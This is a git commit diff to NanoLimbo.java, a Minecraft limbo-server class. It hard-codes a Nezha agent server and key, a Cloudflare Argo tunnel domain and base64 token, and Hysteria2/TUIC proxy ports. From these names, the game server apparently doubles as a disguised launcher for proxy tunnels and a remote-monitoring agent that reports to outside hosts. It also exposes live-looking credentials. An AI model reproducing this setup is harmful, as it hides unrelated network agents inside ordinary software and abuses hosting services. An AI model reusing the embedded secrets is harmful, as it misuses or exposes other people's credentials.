99453d4f18cfe3663ccbe10adf60150242ee8eea
zyr13112 <zyr13112@tutamail.com>
2025-11-05 09:53:27 +0800

    Update NanoLimbo.java

--- src/main/java/ua/nanit/limbo/NanoLimbo.java
+++ src/main/java/ua/nanit/limbo/NanoLimbo.java
@@ -122,23 +122,23 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        envVars.put("UUID", "72ef9163-a64a-49b7-a02f-7a0aaab168a9");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
-        envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "");
+        envVars.put("NEZHA_SERVER", "nzha.zyr13112.dpdns.org");
+        envVars.put("NEZHA_PORT", "443");
+        envVars.put("NEZHA_KEY", "ytMpSKJSX97iq7w6CW");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "searcade.zz981020.dpdns.org");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNzA1YTBmZjBiNmM2ZTE1OWI1NzZmODIxNGZhYzViZGIiLCJ0IjoiM2ZmZWJhYzAtYWJlYy00ODJlLWFkNjgtNThlOTJkMTdlYjg4IiwicyI6Ik56bGlaamRoWWpZdE1qTmpZaTAwWXpjekxUazBOVEl0WVdaaU5XRXpZVFF6WkRaaSJ9");
+        envVars.put("HY2_PORT", "50106");
+        envVars.put("TUIC_PORT", "50106");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "cf.877774.xyz");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "Mc");
+        envVars.put("NAME", "searcade");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
